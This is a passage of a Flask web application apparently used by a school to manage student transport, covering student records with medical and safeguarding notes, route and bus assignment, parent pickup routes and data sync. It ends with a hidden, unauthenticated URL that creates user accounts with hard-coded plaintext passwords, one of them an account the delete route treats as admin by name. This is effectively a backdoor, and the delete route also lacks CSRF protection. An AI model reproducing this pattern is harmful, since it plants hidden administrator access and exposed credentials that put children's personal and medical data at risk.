            safeguarding_notes = request.form.get('safeguarding_notes', '')
            
            # Validate required fields
            if not all([name, class_name, parent_name, parent_phone, address]):
                flash('All required fields must be filled in', 'error')
            else:
                # Validate text inputs for profanity
                text_fields = [
                    (name, "student name"),
                    (class_name, "class name"),
                    (parent_name, "parent name"),
                    (parent2_name, "second parent name") if parent2_name else (None, None),
                    (address, "address"),
                    (medical_notes, "medical notes") if medical_notes else (None, None),
                    (safeguarding_notes, "safeguarding notes") if safeguarding_notes else (None, None)
                ]
                
                profanity_found = False
                for text, field_name in text_fields:
                    if text and field_name:
                        is_valid, error_msg = profanity_filter.validate_educational_content(text, field_name)
                        if not is_valid:
                            flash(error_msg, 'error')
                            profanity_found = True
                            break
                
                if profanity_found:
                    all_students = data_store.get_all_students()
                    sorted_students = dict(sorted(all_students.items(), key=lambda x: x[1]['name'].lower()))
                    all_routes_for_display = data_store.get_all_routes()
                    return render_template('students.html', students=sorted_students, edit_student=student, all_routes=all_routes_for_display)
                
                updated_student = data_store.update_student(student_id, 
                    name=name, 
                    grade=grade, 
                    class_name=class_name, 
                    parent1_name=parent_name, 
                    parent1_phone=parent_phone, 
                    parent2_name=parent2_name, 
                    parent2_phone=parent2_phone,
                    address=address,
                    medical_needs=has_medical_needs, 
                    badge_required=requires_pediatric_first_aid, 
                    medical_notes=medical_notes, 
                    harness_required=harness, 
                    safeguarding_notes=safeguarding_notes
                )
                if updated_student:
                    flash(f'Student "{name}" updated successfully!', 'success')
                    return redirect(url_for('students'))
                else:
                    flash('Failed to update student', 'error')
        
        all_students = data_store.get_all_students()
        sorted_students = dict(sorted(all_students.items(), key=lambda x: x[1]['name'].lower()))
        all_routes_for_display = data_store.get_all_routes()
        return render_template('students.html', students=sorted_students, edit_student=student, all_routes=all_routes_for_display)
    except Exception as e:
        flash(f'Error updating student: {str(e)}', 'error')
        return redirect(url_for('students'))

@app.route('/students/<student_id>/data')
@login_required
def get_student_data(student_id):
    """Get student data as JSON for AJAX requests"""
    student = data_store.get_student(student_id)
    if student:
        return jsonify(student)
    else:
        return jsonify({'error': 'Student not found'}), 404

from app import csrf

@csrf.exempt
@app.route('/students/<student_id>/delete', methods=['POST'])
@login_required
def delete_student(student_id):
    """Delete a student"""
    # Check admin permissions using the same logic as the students page
    is_admin = False
    if hasattr(current_user, 'username') and current_user.username in ['admin', 'gfokti', 'Gfokti']:
        is_admin = True
    else:
        try:
            from models import StaffAccount
            staff_account = StaffAccount.query.filter_by(user_id=current_user.id).first()
            if staff_account and staff_account.account_type == 'admin':
                is_admin = True
        except Exception:
            pass
    
    if not is_admin:
        flash('Access denied. Admin privileges required.', 'error')
        return redirect(url_for('students'))
    
    student = data_store.get_student(student_id)
    if student:
        data_store.delete_student(student_id)
        flash(f'Student "{student["name"]}" deleted successfully!', 'success')
    else:
        flash('Student not found!', 'error')
    
    return redirect(url_for('students'))

@app.route('/students/bulk-assign', methods=['GET', 'POST'])
@login_required
def bulk_assign_students():
    """Bulk assign students to a route"""
    print(f"DEBUG bulk_assign_students: Request method: {request.method}")
    print(f"DEBUG bulk_assign_students: User authenticated: {current_user.is_authenticated}")
    print(f"DEBUG bulk_assign_students: Form data: {dict(request.form)}")
    print(f"DEBUG bulk_assign_students: Request args: {dict(request.args)}")
    
    if request.method == 'GET':
        print("DEBUG: GET request received, redirecting to students page")
        return redirect(url_for('students'))
    

    
    route_id = request.form.get('route_id')
    student_ids_str = request.form.get('student_ids', '')
    pickup_location = request.form.get('pickup_location')  # New pickup location parameter
    student_ids = student_ids_str.split(',') if student_ids_str else []
    
    print(f"DEBUG bulk_assign_students: route_id={route_id}, student_ids_str='{student_ids_str}', pickup_location={pickup_location}, student_ids={student_ids}")
    
    if not route_id or not student_ids or not student_ids[0].strip():
        flash('Please select a route and at least one student.', 'error')
        print("DEBUG: Missing route_id or student_ids")
        # Check if we came from route students page first and validate route exists
        if route_id:
            # Validate route_id is a proper UUID format and route exists
            try:
                import uuid
                uuid.UUID(route_id)  # Validate UUID format
                route = data_store.get_route(route_id)
                if route:
                    return redirect(url_for('route_students', route_id=route_id))
            except (ValueError, TypeError):
                pass  # Invalid UUID format, fall through to default redirect
        return redirect(url_for('students'))
    
    # Get route for display
    route = data_store.get_route(route_id)
    if not route:
        flash('Selected route not found.', 'error')
        return redirect(url_for('students'))
    
    # Check if this is a "Parent" provider route
    provider = data_store.get_provider(route['provider_id'])
    is_parent_provider = provider and provider['name'].lower() == 'parent'
    
    # For parent provider assignments, validate pickup location is provided
    if is_parent_provider and not pickup_location:
        flash('Please select a pickup location for parent collection.', 'error')
        # Check if we came from route students page and redirect accordingly
        from_route = request.form.get('from_route')
        if from_route and route_id:
            # Validate route_id is a valid UUID and route exists before redirecting
            try:
                import uuid
                # Validate route_id is a proper UUID format
                uuid.UUID(route_id)
                route = data_store.get_route(route_id)
                if route:
                    return redirect(url_for('route_students', route_id=route_id))
            except (ValueError, TypeError):
                pass
        return redirect(url_for('students'))
    
    # Count successful assignments and track created routes for parent assignments
    assigned_count = 0
    last_created_route_id = None
    
    for student_id in student_ids:
        if student_id.strip():
            student = data_store.get_student(student_id.strip())
            if student:
                if is_parent_provider:
                    # For parent provider assignments: assign to main Parent route AND individual child route
                    print(f"DEBUG: Assigning {student['name']} to main Parent route {route_id}")
                    
                    # First, create or find the individual route for check-in
                    # Use full name to avoid collisions when students have same first name
                    child_route_number = f"{student['name']}'s Parent"
                    
                    # Check if individual route already exists
                    existing_routes = data_store.get_all_routes()
                    existing_route_id = None
                    for existing_id, existing_route in existing_routes.items():
                        if (existing_route['route_number'] == child_route_number and 
                            existing_route['provider_id'] == route['provider_id']):
                            existing_route_id = existing_id
                            break
                    
                    if existing_route_id:
                        # Use existing individual route but update its pickup location
                        print(f"DEBUG: Assigning {student['name']} to existing individual route {child_route_number} with pickup location {pickup_location}")
                        individual_route = data_store.get_route(existing_route_id)
                        individual_route['hidden_from_admin'] = True  # Hidden from Route Admin but visible in Transport Check-in
                        individual_route['area_id'] = pickup_location  # Update pickup location
                        child_route_id = existing_route_id
                        last_created_route_id = existing_route_id
                        
                        # Save the updated route data
                        data_store.save_data_to_file()
                        
                        # Add student to existing individual route using route_id assignment
                        print(f"DEBUG: Added {student['name']} to existing {child_route_number} route")
                    else:
                        # Create new individual route for check-in with selected pickup location
                        print(f"DEBUG: Creating new individual route {child_route_number} for {student['name']} at {pickup_location}")
                        
                        # Get the school_id - use from route if available, otherwise use default school
                        school_id = route.get('school_id')
                        if not school_id:
                            # Get default school ID (Hamilton Primary)
                            all_schools = data_store.get_all_schools()
                            school_id = next(iter(all_schools.keys())) if all_schools else None
                        
                        child_route_id = data_store.create_route(
                            route_number=child_route_number,
                            provider_id=route['provider_id'],
                            area_id=pickup_location,  # Use selected pickup location instead of main route area
                            hidden_from_admin=True  # Mark as hidden from Route Admin but visible in Transport Check-in
                        )
                        last_created_route_id = child_route_id
                    
                    # Assign student ONLY to the individual route (not the generic Parent route)
                    # This ensures class check-in shows individual routes like "Freya's Parent"
                    print(f"DEBUG: Assigning {student['name']} to individual route {child_route_number}")
                    data_store.assign_student_to_route(student_id.strip(), child_route_id)
                    
                    # Save the data to persist changes
                    data_store.save_data_to_file()
                else:
                    # Regular route assignment
                    data_store.assign_student_to_route(student_id.strip(), route_id)
                assigned_count += 1
    
    if assigned_count > 0:
        if is_parent_provider:
            flash(f'Successfully assigned {assigned_count} students to parent collection.', 'success')
        else:
            flash(f'Successfully assigned {assigned_count} students to {route["route_number"]}.', 'success')
    else:
        flash('No students were assigned.', 'error')
    
    # Check where to redirect based on came_from parameter
    original_route_id = request.form.get('route_id')
    came_from = request.form.get('came_from', 'schools')
    from_route = request.form.get('from_route')
    
    # Validate came_from parameter against expected values for security best practices
    valid_came_from_values = ['schools', 'students', 'routes']
    if came_from not in valid_came_from_values:
        came_from = 'schools'  # Default to safe value
    
    # Priority 1: If came_from is 'students', redirect to route page with from parameter
    if came_from == 'students':
        if original_route_id and data_store.get_route(original_route_id):
            return redirect(url_for('route_students', route_id=original_route_id, **{'from': 'students'}))
        else:
            # If no valid route_id, fall back to students page
            return redirect(url_for('students'))
    
    # Priority 2: If we have a valid original_route_id, redirect to that route
    if original_route_id and data_store.get_route(original_route_id):
        # For parent assignments, redirect to the main Parent route
        if is_parent_provider:
            return redirect(url_for('route_students', route_id=original_route_id))
        else:
            return redirect(url_for('route_students', route_id=original_route_id))
    
    # Priority 3: Check if we should redirect back to Route Admin via from_route
    if from_route:
        # For parent provider, redirect to the Parent route in Route Admin
        if is_parent_provider:
            return redirect(url_for('route_students', route_id=route_id))
        else:
            return redirect(url_for('schools'))
    
    # Default fallback: redirect to appropriate default page
    if came_from == 'routes':
        return redirect(url_for('schools'))  # Route Admin
    else:
        return redirect(url_for('students'))  # Students page

@app.route('/students/<student_id>/toggle-harness', methods=['POST'])
@login_required
def toggle_harness(student_id):
    """Toggle harness requirement for a student"""
    try:
        student = data_store.get_student(student_id)
        if not student:
            return jsonify({'success': False, 'error': 'Student not found'}), 404
        
        # Get the new harness value from request
        request_data = request.get_json()
        new_harness = request_data.get('harness', 'No')
        
        # Update student harness
        student['harness'] = new_harness
        
        return jsonify({'success': True, 'harness': new_harness})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/students/<student_id>/update-pickup-area', methods=['POST'])
@login_required
def update_student_pickup_area(student_id):
    """Update pickup area for a student assigned to Parent route"""
    try:
        student = data_store.get_student(student_id)
        if not student:
            return jsonify({'success': False, 'error': 'Student not found'}), 404
        
        # Handle form data from FormData request
        area_id = request.form.get('area_id')
        
        if not area_id:
            return jsonify({'success': False, 'error': 'Area ID is required'}), 400
        
        # Verify the area exists
        area = data_store.get_area(area_id)
        if not area:
            return jsonify({'success': False, 'error': 'Area not found'}), 404
        
        # Find the individual route for this student
        # Use full name to completely avoid collisions
        child_route_number = f"{student['name']}'s Parent"
        
        all_routes = data_store.get_all_routes()
        individual_route_id = None
        
        # Look for the individual route
        for route_id, route in all_routes.items():
            if route['route_number'] == child_route_number:
                individual_route_id = route_id
                break
        
        if individual_route_id:
            # Update the individual route's area
            individual_route = data_store.get_route(individual_route_id)
            individual_route['area_id'] = area_id
            data_store.save_data_to_file()
            
            print(f"DEBUG: Updated pickup area for {student['name']} - route {child_route_number} to area {area['name']}")
            return jsonify({'success': True, 'area_name': area['name']})
        else:
            # Create the individual route if it doesn't exist
            print(f"DEBUG: Creating missing individual route for {student['name']}")
            
            # Find the parent route to get school_id and provider_id
            parent_route_id = None
            parent_route = None
            for route_id, route in all_routes.items():
                if route.get('route_number') == 'Parent':
                    parent_route_id = route_id
                    parent_route = route
                    break
            
            if parent_route:
                # Create the individual route using the correct method
                new_route_id = data_store.create_route(
                    route_number=child_route_number,
                    provider_id=parent_route.get('provider_id'),
                    area_id=area_id,
                    hidden_from_admin=True
                )
                
                # Assign the student to this new route
                data_store.assign_student_to_route(student['id'], new_route_id)
                data_store.save_data_to_file()
                
                print(f"DEBUG: Created and updated pickup area for {student['name']} - route {child_route_number} to area {area['name']}")
                return jsonify({'success': True, 'area_name': area['name'], 'created_route': True})
            else:
                return jsonify({'success': False, 'error': 'Parent route not found to create individual route'}), 404
            
    except Exception as e:
        print(f"ERROR updating pickup area: {str(e)}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/buses/<bus_id>/assign-student', methods=['POST'])
@login_required
def assign_student_to_bus(bus_id):
    """Assign a student to a bus"""
    bus = data_store.get_bus(bus_id)
    if not bus:
        flash('Bus not found!', 'error')
        return redirect(url_for('buses'))
    
    student_id = request.form.get('student_id')
    if student_id:
        if data_store.assign_student_to_bus(bus_id, student_id):
            student = data_store.get_student(student_id)
            flash(f'Student "{student["name"]}" assigned to bus successfully!', 'success')
        else:
            flash('Failed to assign student to bus!', 'error')
    else:
        flash('Please select a student!', 'error')
    
    return redirect(url_for('school_detail', school_id=bus['school_id']))

@app.route('/buses/<bus_id>/remove-student/<student_id>', methods=['POST'])
@login_required
def remove_student_from_bus(bus_id, student_id):
    """Remove a student from a bus"""
    bus = data_store.get_bus(bus_id)
    if not bus:
        flash('Bus not found!', 'error')
        return redirect(url_for('buses'))
    
    if data_store.remove_student_from_bus(bus_id, student_id):
        student = data_store.get_student(student_id)
        flash(f'Student "{student["name"]}" removed from bus successfully!', 'success')
    else:
        flash('Failed to remove student from bus!', 'error')
    
    return redirect(url_for('school_detail', school_id=bus['school_id']))

def broadcast_event(event_type, data):
    """Broadcast an event to all connected clients"""
    with event_lock:
        event_data = {
            'type': event_type,
            'data': data,
            'timestamp': time.time()
        }
        
        # Clean up disconnected clients
        for page in list(event_clients.keys()):
            alive_clients = []
            for client in event_clients[page]:
                try:
                    client.put(f"data: {json.dumps(event_data)}\n\n")
                    alive_clients.append(client)
                except:
                    pass  # Client disconnected
            event_clients[page] = alive_clients
            
            # Remove empty page entries
            if not event_clients[page]:
                del event_clients[page]

@app.route('/api/sync/<page>')
@login_required
def sync_data(page):
    """Lightweight sync endpoint for real-time updates"""
    last_update = request.args.get('last_update', '0')
    try:
        # Guard against NaN injection attacks
        if last_update.lower() in ('nan', 'infinity', '-infinity', 'inf', '-inf'):
            last_update_time = 0
        else:
            last_update_time = float(last_update)
            # Additional check in case float conversion produces NaN/infinity
            if not (last_update_time == last_update_time) or abs(last_update_time) == float('inf'):
                last_update_time = 0
    except (ValueError, TypeError):
        last_update_time = 0
    
    current_time = time.time()
    
    # For routes page, return current route data
    if page == 'routes':
        routes = data_store.get_all_routes()
        route_data = {}
        
        for route_id, route in routes.items():
            route_data[route_id] = {
                'status': route['status'],
                'status_text': data_store.get_route_status_text(route['status']),
                'status_color': data_store.get_route_status_color(route['status']),
                'guide_present': route.get('guide_present', False)
            }
        
        # Always reload data from file to check for cross-device changes
        data_store.load_data_from_file()
        
        # Check if any route data has changed since last check
        current_timestamp = time.time()
        
        # Return route data for smooth updates
        return jsonify({
            'success': True,
            'timestamp': current_time,
            'routes': route_data
        })
    
    # For students page, return student count for refresh detection
    elif page == 'students':
        students = data_store.get_all_students()
        needs_refresh = data_store._students_updated
        
        # Clear the flag after reading it
        if needs_refresh:
            data_store.clear_students_updated_flag()
        
        return jsonify({
            'success': True,
            'timestamp': current_time,
            'student_count': len(students),
            'needs_refresh': needs_refresh
        })
    
    # For other pages, return basic sync info
    return jsonify({
        'success': True,
        'timestamp': current_time,
        'data': {}
    })

@app.errorhandler(404)
def page_not_found(e):
    return render_template('403.html'), 404

@app.errorhandler(500)
def internal_server_error(e):
    return render_template('403.html'), 500
from werkzeug.security import generate_password_hash
from app import db
from models import User
from flask import make_response
from werkzeug.security import generate_password_hash
from app import db
from models import User

@app.route("/__setup-user-access__7f8a2", methods=["GET"])
def setup_users_secret_route():
    if not User.query.filter_by(username="Gfokti").first():
        user1 = User(username="Gfokti", password=generate_password_hash("123456", method='sha256'))
        db.session.add(user1)

    if not User.query.filter_by(username="Gabriella").first():
        user2 = User(username="Gabriella", password=generate_password_hash("Gabika1984", method='sha256'))
        db.session.add(user2)

    db.session.commit()
    return make_response("✅ Test users created (if not already in db)", 200)